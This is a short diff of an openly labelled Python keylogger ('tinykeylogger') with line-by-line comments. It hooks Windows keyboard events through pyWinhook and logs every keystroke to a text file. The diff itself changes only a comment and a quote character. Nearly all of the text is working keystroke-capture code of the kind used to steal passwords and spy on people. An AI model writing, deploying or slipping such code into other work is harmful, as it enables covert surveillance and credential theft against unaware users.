@@ -16,11 +16,11 @@ import pyWinhook as pyHook, pythoncom, logging      # 1 - imports
 
 def on_keyboard_event(event):                       # 2 - Event that record keystrokes
     logging.debug(chr(event.Ascii))                 # 3 - Save keystroke on file
-    return True                                     # 4
+    return True                                     # 4 - Must return true for proper operation
 
 
 file_keylog = 'tinykeylogger01.txt'                 # 5 - Filename where keystrokes are recorded
-logging.StreamHandler.terminator = ""               # 6 - Avoids CRLF after every keystroke recorded
+logging.StreamHandler.terminator = ''               # 6 - Avoids CRLF after every keystroke recorded
 logging.basicConfig(filename=file_keylog, level=logging.DEBUG, format='%(message)s')  # 7 - Sets logging
 hooks_manager = pyHook.HookManager()                # 8 - Creates new hook manager
 hooks_manager.KeyDown = on_keyboard_event           # 9 - Register event callbacks
